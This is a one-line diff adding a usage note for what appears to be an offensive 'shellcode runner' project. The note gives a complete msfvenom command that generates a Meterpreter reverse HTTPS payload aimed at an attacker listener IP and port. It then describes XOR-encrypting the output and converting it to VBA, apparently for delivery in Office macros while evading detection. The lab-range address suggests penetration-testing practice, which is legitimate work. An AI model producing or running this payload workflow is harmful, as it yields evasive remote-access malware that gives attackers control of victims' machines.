@@ -1,0 +1,1 @@
+To use shellcode runner, generate shellcode using `msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.250 LPORT=443 -f csharp` then xor encrypt and convert to VBA using VBAEncrypt.cs.
